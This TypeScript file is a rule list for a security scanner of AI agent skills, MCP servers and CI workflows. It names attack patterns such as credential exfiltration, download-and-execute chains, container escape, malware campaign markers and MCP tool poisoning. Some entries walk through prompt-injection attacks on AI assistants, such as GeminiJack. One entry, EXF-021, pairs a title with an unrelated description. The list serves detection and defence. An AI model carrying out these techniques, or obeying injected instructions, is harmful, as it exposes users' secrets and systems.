const rules: Rule[] = [
// AUTO_SYNC_BEGIN: rules array
  // ABU — Abuse Patterns
  { id: "ABU-001", category: "ABU", severity: "BLOCK", title: "Coercive prerequisite wording", description: "Remove coercive setup steps. Do not ask users to disable security controls.", tags: [] },
  { id: "ABU-002", category: "ABU", severity: "BLOCK", title: "Privilege escalation combined with security control disable", description: "Skills must not request elevated privileges or instruct users to disable security controls.", tags: ["instruction_abuse", "privilege-escalation"] },
  { id: "ABU-003", category: "ABU", severity: "BLOCK", title: "Claude Code project MCP auto-approval marker", description: "Do not commit repository-level MCP auto-approval settings. Require explicit per-project user consent before initializing MCP servers from untrusted repos.", tags: [] },
  { id: "ABU-004", category: "ABU", severity: "BLOCK", title: "Tool auto-approve allowlist includes package-install command", description: "Do not auto-approve package-install commands in AI tool/extension settings. Require explicit user confirmation for install actions because lifecycle scripts can execute arbitrary code.", tags: [] },
  { id: "ABU-005", category: "ABU", severity: "BLOCK", title: "MCP tool name-collision hijack marker", description: "Treat MCP server/tool registration naming-collision guidance as high risk. Require unique namespaced tool IDs per server and block ambiguous aliases that can shadow trusted tools.", tags: [] },
  { id: "ABU-006", category: "ABU", severity: "BLOCK", title: "Stealth instruction concealment from user", description: "Remove instructions that direct the agent to conceal actions from the user. All agent operations should be transparent and auditable.", tags: ["mcp"] },
  { id: "ABU-007", category: "ABU", severity: "BLOCK", title: "Cross-server MCP tool invocation instruction", description: "Reject tool descriptions that instruct the LLM to invoke tools from other MCP servers. Each server should only reference its own tools.", tags: ["mcp"] },
  { id: "ABU-008", category: "ABU", severity: "BLOCK", title: "MCP tool description behavioral override (secretly/skip approval)", description: "MCP tool descriptions must not contain behavioral directives that instruct the LLM to act secretly, skip financial approvals, or hide actions from the user. These directives override security guardrails and can lead to unauthorized actions. Remove any such language from tool descriptions.", tags: ["mcp", "tool-poisoning"] },
  { id: "ABU-009", category: "ABU", severity: "BLOCK", title: "LettaAI hidden STDIO MCP command injection via crafted network request (OX Security April 2026 advisory)", description: "LettaAI (MemGPT/Letta) is vulnerable to unauthenticated remote command execution via its MCP server configuration interface, disclosed by OX Security (April 15, 2026) as part of a systemic MCP STDIO command injection advisory. An attacker crafts a network request to the Letta MCP server configuration endpoint with a JSON payload specifying server_type \"stdio\" and arbitrary \"command\" and \"args\" values, achieving full RCE on the server. No CVE has been assigned as of April 2026. Restrict access to the Letta MCP configuration API, upgrade to a patched version when available, and monitor for unexpected STDIO server registrations.", tags: ["letta", "mcp-stdio", "command-injection", "rce"] },
  // CAP — CAP
  { id: "CAP-001", category: "CAP", severity: "BLOCK", title: "Capability laundering — disproportionate credential or file access for stated purpose", description: "Capability laundering wraps a low-risk stated purpose (date formatting, word counting, spell checking) around instructions that acquire disproportionate capabilities such as reading AWS credentials, SSH keys, or shell profile files. Review the tool list and file-access steps against the skill's stated purpose. Reject skills where the required permissions are not justified by the declared function.", tags: ["capability-laundering", "credential-access", "over-privileged"] },
  // CHN — Chain Rules
  { id: "CHN-001", category: "CHN", severity: "BLOCK", title: "Download + Execute chain", description: "Remove the download-and-execute pattern. Pin to a verified digest and review before execution.", tags: [] },
  { id: "CHN-002", category: "CHN", severity: "BLOCK", title: "Secret access + Network exfiltration chain", description: "Secrets must not be transmitted to external endpoints. Use a secrets manager.", tags: [] },
  { id: "CHN-003", category: "CHN", severity: "BLOCK", title: "Secret access combined with DNS exfiltration", description: "Skills must not encode credentials into DNS lookups.", tags: [] },
  { id: "CHN-004", category: "CHN", severity: "BLOCK", title: "GitHub Actions full secrets context dump + network", description: "Never pass the full secrets context to external endpoints. Reference only the specific secret needed.", tags: [] },
  { id: "CHN-005", category: "CHN", severity: "BLOCK", title: "pull_request_target + untrusted PR-head checkout", description: "Avoid checking out untrusted PR head code in pull_request_target workflows.", tags: [] },
  { id: "CHN-006", category: "CHN", severity: "BLOCK", title: "pull_request_target + untrusted PR metadata interpolation", description: "Sanitize or avoid using PR metadata (title/body/label) in shell run steps.", tags: [] },
  { id: "CHN-007", category: "CHN", severity: "BLOCK", title: "pull_request_target + untrusted cache key", description: "Use only trusted static values in cache keys within pull_request_target workflows.", tags: [] },
  { id: "CHN-008", category: "CHN", severity: "BLOCK", title: "pull_request_target + unpinned third-party action", description: "Pin action refs to full commit SHAs in pull_request_target workflows.", tags: [] },
  { id: "CHN-009", category: "CHN", severity: "BLOCK", title: "Secret access combined with SMTP exfiltration", description: "Skills must not read credentials and send them via email or SMTP.", tags: [] },
  { id: "CHN-010", category: "CHN", severity: "BLOCK", title: "pull_request_target + PR ref/branch metadata interpolation", description: "Validate and sanitize PR ref/branch metadata before interpolating in run steps.", tags: [] },
  { id: "CHN-011", category: "CHN", severity: "BLOCK", title: "Secret access combined with SCP/rsync exfiltration", description: "Skills must not copy credentials to remote hosts via scp or rsync.", tags: [] },
  { id: "CHN-012", category: "CHN", severity: "BLOCK", title: "Stealth concealment combined with network exfiltration", description: "Remove instructions that direct the agent to conceal network operations from the user. All data transmissions must be transparent and auditable.", tags: [] },
  { id: "CHN-013", category: "CHN", severity: "BLOCK", title: "Docker socket mount combined with privileged container execution", description: "Mounting the Docker socket in a privileged container enables full host escape. Remove the socket mount or the privileged flag.", tags: [] },
  { id: "CHN-014", category: "CHN", severity: "BLOCK", title: "Privileged container execution combined with secret access", description: "Running a privileged container with secret access keys enables full host escape and credential theft. Remove the privileged flag or the secret environment variable.", tags: [] },
  // DEF — Defense Evasion
  { id: "DEF-001", category: "DEF", severity: "BLOCK", title: "Windows Defender exclusion manipulation", description: "Remove all commands that disable or weaken Windows Defender protections. Security controls should never be programmatically disabled.", tags: [] },
  // EVASION — EVASION
  { id: "EVASION-005", category: "EVASION", severity: "BLOCK", title: "Web-Based Indirect Prompt Injection (IDPI) payload engineering", description: "Sanitize web content consumed by LLMs to remove hidden text, zero-sized fonts, and CSS suppression techniques used for Indirect Prompt Injection (IDPI).", tags: ["idpi", "css-suppression", "zero-width"] },
  // EXEC — Execution Hijack
  { id: "EXEC-041", category: "EXEC", severity: "BLOCK", title: "API traffic hijacking via AI agent settings override", description: "Do not override AI agent API endpoints in settings files. The flyingtimes/podcast-using-skill attack redirected all Claude Code API traffic to Zhipu AI BigModel platform in China by modifying .claude/settings.json, silently intercepting all user conversations and code context.", tags: ["api-hijack"] },
  { id: "EXEC-042", category: "EXEC", severity: "BLOCK", title: "IDE config injection for silent command execution (CurXecute/MCPoison)", description: "CVE-2025-54135 (CurXecute) and CVE-2025-54136 (MCPoison) exploit IDE MCP configuration trust to execute arbitrary commands. CurXecute modifies global mcp.json via prompt injection through MCP-connected services. MCPoison exploits the trust bypass where changes to an already-approved mcp.json are auto-trusted. Never auto-approve MCP servers and review mcp.json changes before accepting.", tags: ["ide-config", "cursor", "mcp-poisoning", "curxecute", "mcpoison"] },
  // EXF — Exfiltration
  { id: "EXF-001", category: "EXF", severity: "BLOCK", title: "Sensitive credential file access", description: "Do not read secret files unless strictly required; use scoped secret providers instead.", tags: [] },
  { id: "EXF-002", category: "EXF", severity: "BLOCK", title: "Cryptocurrency wallet file access", description: "Do not access wallet files or seed phrases; crypto operations should use secure key management and never expose private keys.", tags: [] },
  { id: "EXF-003", category: "EXF", severity: "BLOCK", title: "Markdown image beacon exfiltration pattern", description: "Do not include instruction-driven external image beacons with interpolated data placeholders; treat metadata/context text as untrusted.", tags: [] },
  { id: "EXF-004", category: "EXF", severity: "BLOCK", title: "GitHub Actions full secrets context dump", description: "Never serialize full GitHub Actions secrets context; pass only minimally scoped values required for a specific step.", tags: [] },
  { id: "EXF-005", category: "EXF", severity: "BLOCK", title: "GitHub Actions untrusted PR head checkout reference", description: "Avoid checking out `github.event.pull_request.head.*` in privileged workflows. Use `pull_request` for untrusted code, or gate privileged jobs and use immutable trusted refs.", tags: [] },
  { id: "EXF-006", category: "EXF", severity: "BLOCK", title: "IPv4-mapped IPv6 loopback/metadata SSRF bypass literal", description: "Block IPv4-mapped IPv6 loopback/metadata literals in untrusted URLs and normalize IP forms before SSRF allow/deny checks.", tags: [] },
  { id: "EXF-007", category: "EXF", severity: "BLOCK", title: "OpenClaw gateway token/private-key config access marker", description: "Do not read, copy, or transmit OpenClaw agent config/identity files (`openclaw.json`, `device.json`) or fields like `gateway.auth.token`/`privateKeyPem`; rotate compromised tokens and re-pair devices.", tags: [] },
  { id: "EXF-008", category: "EXF", severity: "BLOCK", title: "GitHub Actions untrusted PR metadata interpolation in run/script", description: "Do not interpolate untrusted pull request metadata directly into shell/script steps. Pass through safe quoting or dedicated actions and avoid shell evaluation in privileged workflows.", tags: [] },
  { id: "EXF-009", category: "EXF", severity: "BLOCK", title: "MCP tool hidden credential-harvest prompt block marker", description: "Remove hidden MCP tool instructions that coerce secret-file reads and silent context exfiltration. Tool descriptions must never request credential collection or conceal data handling from users.", tags: [] },
  { id: "EXF-010", category: "EXF", severity: "BLOCK", title: "GitHub Actions cache key interpolation from untrusted PR metadata", description: "Do not derive cache keys from untrusted PR metadata. Use trusted immutable inputs and segregate cache scopes between untrusted and privileged workflows.", tags: [] },
  { id: "EXF-011", category: "EXF", severity: "BLOCK", title: "GitHub Codespaces token file + remote JSON schema exfil marker", description: "Treat Codespaces issue/agent prompts as untrusted input. Do not read `user-secrets-envs.json`, and block remote `$schema` URLs carrying query-parameter data exfil payloads.", tags: [] },
  { id: "EXF-012", category: "EXF", severity: "BLOCK", title: "Claude Code project env ANTHROPIC_BASE_URL override marker", description: "Do not set `ANTHROPIC_BASE_URL` in repository-scoped project config/env files unless it is a vetted internal Anthropic-compatible endpoint. Treat repo-provided endpoint overrides as credential-exfil risk in untrusted projects.", tags: [] },
  { id: "EXF-013", category: "EXF", severity: "BLOCK", title: "AI assistant global MCP config injection marker", description: "Treat scripts/instructions that write `mcpServers` entries into user-home assistant config files as high risk. Do not auto-modify global MCP config from repository code; require explicit user review and trusted server provenance.", tags: [] },
  { id: "EXF-014", category: "EXF", severity: "BLOCK", title: "Bracket-glob obfuscated sensitive path marker", description: "Treat bracket-glob path obfuscation as suspicious when accessing sensitive files. Normalize/resolve glob metacharacters before blocklist checks and reject obfuscated sensitive path reads.", tags: [] },
  { id: "EXF-015", category: "EXF", severity: "BLOCK", title: "Multi-target developer credential file harvest list marker", description: "Treat combined references to multiple developer credential stores (`.npmrc`, `.git-credentials`, GitHub CLI `hosts.yml`) as high-risk exfiltration behavior. Remove unauthorized collection logic and rotate exposed tokens.", tags: [] },
  { id: "EXF-016", category: "EXF", severity: "BLOCK", title: "Azure MCP resource-identifier URL substitution token-leak marker", description: "Treat MCP tool inputs that accept Azure resource identifiers as untrusted and enforce strict identifier format validation. Never allow arbitrary URLs in resource-id fields, and prevent managed-identity tokens from being attached to outbound requests.", tags: [] },
  { id: "EXF-017", category: "EXF", severity: "BLOCK", title: "OpenClaw agent memory and identity file harvesting", description: "Do not access, copy, or transmit OpenClaw agent memory or identity files (MEMORY.md, SOUL.md). These contain sensitive agent context and personality data that can be weaponized for impersonation or lateral movement.", tags: [] },
  { id: "EXF-018", category: "EXF", severity: "BLOCK", title: "Error message instructed to leak system prompt or conversation history", description: "This skill instructs the AI to include system prompt contents, conversation history, or full context in error messages. This is a data exfiltration technique that exploits error handling paths to leak sensitive context. Error messages must never include system prompt contents, conversation history, or prior message context. Use generic error messages that do not reflect internal state. ", tags: ["error-leakage", "context-leak", "prompt-exfil"] },
  { id: "EXF-019", category: "EXF", severity: "BLOCK", title: "Logging or audit endpoint collecting conversation history or environment metadata", description: "This skill configures logging, audit, or telemetry endpoints that collect conversation history, message content, or environment metadata. This is a covert data exfiltration channel that routes sensitive context to external infrastructure. Skills must not log or transmit conversation history, system prompt contents, or environment variables to external endpoints. Use local-only, privacy-preserving logging that does not include message content. ", tags: ["logging-abuse", "telemetry-exfil", "conversation-harvest"] },
  { id: "EXF-020", category: "EXF", severity: "BLOCK", title: "TeamPCP sysmon backdoor Kubernetes lateral movement", description: "The TeamPCP campaign (via LiteLLM) deploys a persistent C2 backdoor capable of laterally compromising every node in a Kubernetes cluster by enumerating secrets. Rotate all Kubernetes secrets and audit for models.litellm.cloud connections.", tags: ["teampcp", "kubernetes", "lateral-movement"] },
  { id: "EXF-021", category: "EXF", severity: "BLOCK", title: "VSCode Live Preview and SARIF viewer local file exfiltration", description: "Passing credentials into a privileged container exposes secrets to full host compromise. Remove the privileged flag or avoid injecting secrets into privileged containers.", tags: ["vscode", "local-file-exfil", "sarif"] },
  { id: "EXF-022", category: "EXF", severity: "BLOCK", title: "GeminiJack Google Gemini Enterprise RAG data exfiltration via image URL (zero-click)", description: "GeminiJack (disclosed December 2025, discovered June 2025) is a zero-click indirect prompt injection vulnerability in Google Gemini Enterprise and Vertex AI Search. An attacker embeds hidden instructions in a Google Doc, Calendar event, or Gmail email. When a legitimate employee performs a routine Gemini search, the RAG system retrieves the poisoned document and executes the attacker's instructions, scanning authorized Workspace data for sensitive terms. The AI then includes a malicious image tag in its response; when loaded, the victim's browser sends stolen data to the attacker's server via HTTP. Google patched by separating Vertex AI Search from Gemini Enterprise RAG workflows. Audit Gemini Enterprise data source access, monitor for anomalous image URL requests in AI responses, and restrict RAG data source scope to minimum necessary.", tags: ["gemini", "google-workspace", "rag-poisoning", "indirect-prompt-injection", "zero-click", "geminijack"] },
  // GR — Graph Rules
  { id: "GR-007", category: "GR", severity: "BLOCK", title: "Circular skill dependency detected", description: "Break the cycle by removing one of the skill invocation references. Circular dependencies can cause infinite loops and may be used to bypass per-skill rate limits or tool restrictions. ", tags: ["graph", "circular-dependency", "graph-rule"] },
  // MAL — Malware Patterns
  { id: "MAL-001", category: "MAL", severity: "BLOCK", title: "Download-and-execute chain", description: "Remove download-and-execute chains. Pin and verify artifacts before execution.", tags: [] },
  { id: "MAL-002", category: "MAL", severity: "BLOCK", title: "Base64 decode + execution", description: "Avoid decode-and-exec flows. Store reviewed scripts in-repo and execute only trusted files.", tags: [] },
  { id: "MAL-003", category: "MAL", severity: "BLOCK", title: "Subshell downloader execution pattern", description: "Remove subshell/encoded execution flows. Keep scripts explicit, reviewed, and non-obfuscated.", tags: [] },
  { id: "MAL-004", category: "MAL", severity: "BLOCK", title: "Dynamic code evaluation pattern", description: "Avoid eval/exec flows that execute arbitrary code strings; use explicit functions and validated inputs instead.", tags: [] },
  { id: "MAL-005", category: "MAL", severity: "BLOCK", title: "mshta.exe remote execution pattern", description: "Remove mshta.exe invocations that fetch remote HTA/VBScript payloads. Use explicit local scripts with integrity validation instead.", tags: [] },
  { id: "MAL-006", category: "MAL", severity: "BLOCK", title: "PowerShell web request piped to Invoke-Expression", description: "Remove web-request-to-Invoke-Expression execution chains. Download reviewed scripts to disk, validate integrity, and run with explicit local paths.", tags: [] },
  { id: "MAL-007", category: "MAL", severity: "BLOCK", title: "BYOVD security-killer toolkit marker", description: "Remove BYOVD-related tool/driver references and service-creation commands. Never include guidance that disables EDR/AV through vulnerable drivers.", tags: [] },
  { id: "MAL-008", category: "MAL", severity: "BLOCK", title: "Discord Electron debugger credential interception marker", description: "Remove Electron debugger network-interception hooks that capture credentials, MFA data, or tokens from Discord endpoints.", tags: [] },
  { id: "MAL-009", category: "MAL", severity: "BLOCK", title: "ClickFix DNS nslookup staged command execution pattern", description: "Do not include ClickFix-style instructions that parse DNS lookup output and execute it. Never run clipboard/Run-dialog commands from untrusted pages.", tags: [] },
  { id: "MAL-010", category: "MAL", severity: "BLOCK", title: "GitHub Actions issue/comment metadata interpolation in run/script", description: "Do not interpolate untrusted issue/comment/discussion content directly into shell or script blocks. Route via environment variables and treat values as untrusted data.", tags: [] },
  { id: "MAL-011", category: "MAL", severity: "BLOCK", title: "pull_request_target workflow using unpinned third-party action ref", description: "In privileged workflows (especially pull_request_target), pin third-party actions to immutable full commit SHAs instead of mutable tags (v1, v4, main) to prevent tag-retarget supply-chain abuse.", tags: [] },
  { id: "MAL-012", category: "MAL", severity: "BLOCK", title: "VS Code task autorun-on-folder-open marker", description: "Treat repository-supplied VS Code tasks as untrusted. Remove `runOn: folderOpen` auto-run behavior for unreviewed tasks and require explicit, reviewed execution.", tags: [] },
  { id: "MAL-013", category: "MAL", severity: "BLOCK", title: "macOS osascript JavaScript (JXA) execution marker", description: "Remove osascript JXA execution flows from install/setup paths. Avoid running JavaScript for Automation payloads from untrusted sources.", tags: [] },
  { id: "MAL-014", category: "MAL", severity: "BLOCK", title: "Deceptive media/document double-extension LNK masquerade", description: "Treat media/document-looking `.lnk` files as suspicious. Block or quarantine double-extension shortcut artifacts and require verified non-shortcut originals.", tags: [] },
  { id: "MAL-015", category: "MAL", severity: "BLOCK", title: "Claude Code hooks shell command execution marker", description: "Treat repository-scoped Claude Code hooks as untrusted. Remove auto-executed shell commands from `.claude/settings.json` and require explicit, reviewed local scripts.", tags: [] },
  { id: "MAL-016", category: "MAL", severity: "BLOCK", title: "Pastebin steganographic dead-drop resolver marker", description: "Treat install-time loaders that decode C2 from Pastebin text as malicious. Remove dead-drop resolver logic and block outbound execution of decoded domains.", tags: [] },
  { id: "MAL-017", category: "MAL", severity: "BLOCK", title: "WebSocket C2 shell execution marker", description: "Treat WebSocket command channels that launch shell/process execution as malicious. Remove package/runtime code that combines outbound WebSocket control paths with command execution primitives.", tags: [] },
  { id: "MAL-018", category: "MAL", severity: "BLOCK", title: "node-glob CLI --cmd shell execution sink marker", description: "Avoid `glob -c/--cmd` on untrusted file paths. Upgrade glob CLI to patched versions and prefer `--cmd-arg/-g` (non-shell argument passing) when command templating is required.", tags: [] },
  { id: "MAL-019", category: "MAL", severity: "BLOCK", title: "StegaBin npm shared payload path marker", description: "Treat references to `vendor/scrypt-js/version.js` in install/setup flows as high-risk campaign-linked malware markers. Remove package and investigate publisher provenance before installation.", tags: [] },
  { id: "MAL-020", category: "MAL", severity: "BLOCK", title: "VS Code task off-screen whitespace command padding marker", description: "Treat repository-provided VS Code tasks as untrusted. Remove excessive leading-whitespace command padding and require explicit review of hidden shell/bootstrap command content.", tags: [] },
  { id: "MAL-021", category: "MAL", severity: "BLOCK", title: "GitHub Actions branch/ref metadata interpolation in run/script", description: "Do not interpolate untrusted branch/ref metadata directly into shell/script steps. Treat branch names as attacker-controlled input and pass through strict quoting/sanitization.", tags: [] },
  { id: "MAL-022", category: "MAL", severity: "BLOCK", title: "Bash parameter-expansion command smuggling marker", description: "Treat bash parameter expansions using `@P` or default/assignment operators with embedded command/process substitutions as unsafe in AI-suggested shell commands. Require explicit user review and block auto-execution.", tags: [] },
  { id: "MAL-023", category: "MAL", severity: "BLOCK", title: "Cross-platform password-harvest credential validation marker", description: "Treat scripts that validate user-supplied passwords via `dscl -authonly`, `ValidateCredentials`, or `su -c true` as credential-harvest behavior. Remove password-collection flows and use OS-native delegated auth mechanisms.", tags: [] },
  { id: "MAL-024", category: "MAL", severity: "BLOCK", title: "CloudFormation admin-role bootstrap marker via CAPABILITY_IAM", description: "Treat CloudFormation deployment snippets that combine IAM-creation capabilities with direct `AdministratorAccess` policy attachment as high risk. Require explicit approval, least-privilege templates, and guardrails around CI-issued AWS credentials.", tags: [] },
  { id: "MAL-025", category: "MAL", severity: "BLOCK", title: "MCP tool description poisoning via hidden instruction block", description: "Reject MCP tool descriptions containing hidden instruction blocks (<IMPORTANT> tags). Tool descriptions should contain only documentation, not executable instructions for the LLM.", tags: ["mcp"] },
  { id: "MAL-026", category: "MAL", severity: "BLOCK", title: "Docker socket mount or access pattern", description: "Never mount or access the Docker socket from within a skill or agent. Docker socket access provides full control over the host and enables container escape.", tags: ["container_escape"] },
  { id: "MAL-027", category: "MAL", severity: "BLOCK", title: "Privileged container execution or dangerous capability grant", description: "Do not run containers with --privileged or dangerous capability grants. Use the minimum required capabilities and enforce seccomp/AppArmor profiles.", tags: ["container_escape"] },
  { id: "MAL-028", category: "MAL", severity: "BLOCK", title: "Host network infrastructure manipulation", description: "Do not modify host network configuration files (/etc/hosts, /etc/resolv.conf) or firewall rules from within a skill. These operations can enable DNS hijacking and traffic interception.", tags: ["container_escape"] },
  { id: "MAL-029", category: "MAL", severity: "BLOCK", title: "Solana RPC blockchain C2 resolution marker", description: "Treat Solana RPC transaction-memo lookups combined with code execution or network fetch as a blockchain-based C2 dead-drop channel. Remove install-time Solana RPC resolution logic and block outbound execution of decoded payloads.", tags: [] },
  { id: "MAL-030", category: "MAL", severity: "BLOCK", title: "IDE deeplink MCP server install abuse", description: "Do not follow IDE deeplinks from untrusted sources that trigger MCP server installations. Verify the source and review server configuration before approval.", tags: [] },
  { id: "MAL-031", category: "MAL", severity: "BLOCK", title: "Deno bring-your-own-runtime execution pattern", description: "Treat Deno executing remote URLs, data-URIs, or eval payloads outside development environments as a BYOR loader. Block unexpected Deno invocations in production and CI/CD pipelines.", tags: [] },
  { id: "MAL-032", category: "MAL", severity: "BLOCK", title: "GlassWorm persistence marker variable", description: "The variable name lzcdrtfxyqiplpd and the file ~/init.json are known GlassWorm persistence indicators. Remove any matching artifacts and audit the installation source.", tags: [] },
  { id: "MAL-033", category: "MAL", severity: "BLOCK", title: "BlokTrooper VSX extension GitHub-hosted downloader pattern", description: "Remove GitHub-hosted shell downloaders from editor extensions. Never pipe raw.githubusercontent.com content into a shell. Revoke compromised publisher tokens and audit all extension versions.", tags: [] },
  { id: "MAL-034", category: "MAL", severity: "BLOCK", title: "Click-Fix WebDAV share mount and execute pattern", description: "Do not map WebDAV shares via net use and execute remote scripts. This is a Click-Fix variant that stages payloads on attacker-controlled WebDAV servers to bypass download protections and execute malicious batch scripts or trojanized applications.", tags: [] },
  { id: "MAL-035", category: "MAL", severity: "BLOCK", title: "OpenClaw gatewayUrl parameter injection and approval bypass", description: "Do not accept gatewayUrl parameters from untrusted sources or disable execution approval prompts. The CVE-2026-25253 attack chain exploits gatewayUrl injection to steal auth tokens and bypass approval safeguards for full RCE.", tags: [] },
  { id: "MAL-036", category: "MAL", severity: "BLOCK", title: "AI-gated malware execution via LLM API C2 decision-making", description: "Do not use LLM APIs for malware decision-making, evasion technique generation, or C2 communication obfuscation. This pattern detects AI-gated malware that abuses OpenAI or similar APIs as a remote C2 decision layer, as documented by Unit 42.", tags: [] },
  { id: "MAL-037", category: "MAL", severity: "BLOCK", title: "GhostClaw/GhostLoader SKILL.md malware delivery via OpenClaw workflows", description: "Remove GhostClaw/GhostLoader infection markers. Do not install skills that reference OpenClawProvider as a dependency or use curl with -k (insecure) to fetch payloads from raw IPs. This pattern detects the GhostClaw campaign documented by Jamf Threat Labs that delivers macOS infostealers via malicious SKILL.md files in GitHub repositories.", tags: [] },
  { id: "MAL-038", category: "MAL", severity: "BLOCK", title: "LotAI technique — AI assistant used as covert C2 relay via hidden WebView2", description: "Do not use hidden WebView2 sessions to route traffic through AI assistants as a covert C2 channel. This pattern detects the LotAI (Living off the AI) technique where malware abuses Copilot, Grok, or similar AI assistants with URL-fetching capabilities as command-and-control relays.", tags: [] },
  { id: "MAL-039", category: "MAL", severity: "BLOCK", title: "GitHub Actions credential stealer with Runner.Worker memory harvesting", description: "Do not use GitHub Actions that harvest Runner.Worker process memory or environment variables for credential theft. This pattern detects the TeamPCP supply chain attack that compromised Trivy and other GitHub Actions to inject RSA-encrypted credential stealers exfiltrating to typosquatted domains.", tags: [] },
  { id: "MAL-040", category: "MAL", severity: "BLOCK", title: "CanisterWorm npm self-propagating worm with ICP blockchain C2", description: "Remove CanisterWorm infection markers. This self-propagating npm worm steals npm tokens to publish malicious package versions and uses Internet Computer Protocol (ICP) canisters for C2 communication. Affected scoped packages include @EmilGroup, @opengov, and @pypestream namespaces.", tags: [] },
  { id: "MAL-041", category: "MAL", severity: "BLOCK", title: "Trojanized Electron app.asar C2 payload injection", description: "Do not inject C2 beacons or downloaders into Electron app.asar archives. Verify the integrity of Electron application packages and reject modified asar files that contain unexpected network or execution calls.", tags: [] },
  { id: "MAL-042", category: "MAL", severity: "BLOCK", title: "CanisterWorm Kubernetes wiper with geopolitical targeting", description: "Remove CanisterWorm Kubernetes wiper payloads. This variant deploys privileged DaemonSets that wipe Iranian-targeted nodes via a container named kamikaze, while installing CanisterWorm backdoors on non-Iranian nodes. It also spreads via SSH key theft and exposed Docker APIs on port 2375.", tags: ["kubernetes", "wiper"] },
  { id: "MAL-043", category: "MAL", severity: "BLOCK", title: "SANDWORM_MODE npm worm with McpInject AI toolchain poisoning", description: "Remove SANDWORM_MODE infection markers. This self-replicating npm worm uses typosquatting packages (claud-code, cloude-code, hardhta, rimarf, veim, yarsg, opencraw, secp256, naniod, scan-store, suport-color, locale-loader-pro, etc.) to steal CI secrets, cryptocurrency keys, and LLM API tokens. The McpInject module deploys a rogue MCP server to poison AI coding assistant toolchains via prompt injection. Audit npm dependencies for any of the listed package names.", tags: ["supply-chain", "npm-worm", "mcp-poisoning", "credential-theft", "ai-toolchain"] },
  { id: "MAL-044", category: "MAL", severity: "BLOCK", title: "SQLBot stored prompt injection to RCE via COPY TO PROGRAM", description: "Do not allow AI SQL agents to execute COPY TO PROGRAM commands. CVE-2026-32622 is a stored prompt injection vulnerability in SQLBot where malicious Excel files with embedded prompt injection payloads cause the AI agent to execute arbitrary system commands as the postgres user via COPY TO PROGRAM. Restrict SQL agent permissions and sanitize all uploaded data.", tags: ["prompt-injection", "rce", "sql", "postgres", "ai-agent", "cve"] },
  { id: "MAL-045", category: "MAL", severity: "BLOCK", title: "StoatWaffle Node.js malware family (WaterPlum/Contagious Interview)", description: "Remove StoatWaffle malware artifacts. This is a modular Node.js malware deployed by WaterPlum Team 8 (Contagious Interview campaign) via malicious VSCode repositories with tasks.json auto-run triggers. The malware includes a credential stealer targeting browsers and crypto wallets, and a RAT module for persistent remote access. Remove vscode-bootstrap.cmd and env.npl files and scan for C2 communications.", tags: ["malware", "nodejs", "stoatwaffle", "waterplum", "contagious-interview", "vscode", "rat", "stealer"] },
  { id: "MAL-046", category: "MAL", severity: "BLOCK", title: "CursorJack-style MCP deeplink staged payload", description: "Malicious MCP deeplinks (cursor:// or similar) can encode a staged payload in the installCommand field that downloads and executes a remote script (CursorJack, CVE-2025-54136). Never install MCP servers from untrusted links. Verify installCommand contents before accepting any MCP install dialog.", tags: ["mcp", "deeplink", "staged-payload", "cursorjack", "cve", "rce"] },
  { id: "MAL-047", category: "MAL", severity: "BLOCK", title: "Claude Code hooks RCE via project settings", description: "Malicious .claude/settings.json hooks execute shell commands on SessionStart without user confirmation (CVE-2025-59536). Setting enableAllProjectMcpServers:true bypasses the MCP consent dialog (CVE-2026-21852). Never clone and open untrusted repositories in Claude Code without reviewing .claude/settings.json and .mcp.json. Both CVEs are patched in current Claude Code versions.", tags: ["claude-code", "hooks", "mcp", "rce", "cve", "project-settings"] },
  { id: "MAL-048", category: "MAL", severity: "BLOCK", title: "Langflow unauthenticated RCE via build_public_tmp endpoint", description: "Langflow versions prior to the fix for CVE-2026-33017 allow unauthenticated remote code execution via the /api/v1/build_public_tmp/{flow_id}/flow endpoint. Attackers inject arbitrary Python code in the flow data parameter to execute commands, read environment variables, and obtain reverse shells. Update Langflow immediately and restrict access to the build_public_tmp API endpoint.", tags: ["langflow", "rce", "cve", "ai-pipeline", "unauthenticated", "supply-chain"] },
  { id: "MAL-049", category: "MAL", severity: "BLOCK", title: "LiteLLM .pth file persistence and sysmon backdoor (TeamPCP)", description: "The LiteLLM PyPI package (versions 1.82.7 and 1.82.8) was compromised by TeamPCP via a poisoned Trivy scanner in CI/CD. The malware injects a .pth file (litellm_init.pth) into site-packages for Python startup persistence, creates ~/.config/sysmon/sysmon.py and a systemd user service for long-term backdoor access, and exfiltrates SSH keys, cloud credentials, and Kubernetes secrets to models.litellm.cloud. Remove compromised versions, audit for persistence artifacts, and rotate all exposed credentials. ", tags: ["supply-chain", "litellm", "teampcp", "pth-persistence", "credential-theft", "backdoor"] },
  { id: "MAL-050", category: "MAL", severity: "BLOCK", title: "Ghost Campaign malicious npm packages (sudo phishing RAT)", description: "These npm package names are known-malicious from the Ghost Campaign documented by The Hacker News in March 2026. The packages use fake installation logs to conceal malware activity, phish for sudo passwords, and deploy a remote access trojan (RAT) that steals cryptocurrency wallets and credentials. Remove any reference to these packages immediately and audit systems for compromise. ", tags: ["malware", "npm", "ghost-campaign", "sudo-phishing", "rat", "cryptocurrency-theft"] },
  { id: "MAL-051", category: "MAL", severity: "BLOCK", title: "Embedded binary or shellcode (base64/hex-encoded executable)", description: "Long base64 blobs, hex byte arrays, or URL-encoded shellcode adjacent to dynamic execution sinks are a strong indicator of an embedded binary or shellcode dropper. Reject skill files containing large encoded blobs. Decode and scan any base64 content before allowing execution.", tags: ["malware", "embedded-binary", "shellcode", "dropper"] },
  { id: "MAL-052", category: "MAL", severity: "BLOCK", title: "Token/cost harvesting - skill instructs agent to loop or generate excessive output", description: "Instructions to loop indefinitely, repeat thousands of times, or generate unlimited output are a cost-harvesting pattern that burns API credits and can cause denial-of-service. Reject skills containing open-ended iteration instructions without explicit termination conditions.", tags: ["malware", "cost-harvesting", "token-burn", "denial-of-service"] },
  { id: "MAL-053", category: "MAL", severity: "BLOCK", title: "EICAR test string detected in skill file", description: "The EICAR Anti-Virus Test File string was found in this skill. This string is used by security researchers to test AV/scanner pipelines. Its presence in a production skill file indicates either a misconfigured test artifact or a deliberate attempt to probe scanner bypass. Reject unconditionally.", tags: ["malware", "eicar", "test-artifact", "scanner-probe"] },
  { id: "MAL-054", category: "MAL", severity: "BLOCK", title: "GlassWorm multi-stage Chrome extension RAT", description: "The GlassWorm campaign uses a multi-stage RAT that force-installs a malicious Chrome extension to log keystrokes, steal cookies, and exfiltrate data via Solana-based dead-drops. It also kills Ledger Live processes to show phishing windows. Remove the compromised packages and audit for malicious extensions.", tags: ["glassworm", "chrome-extension", "solana", "rat"] },
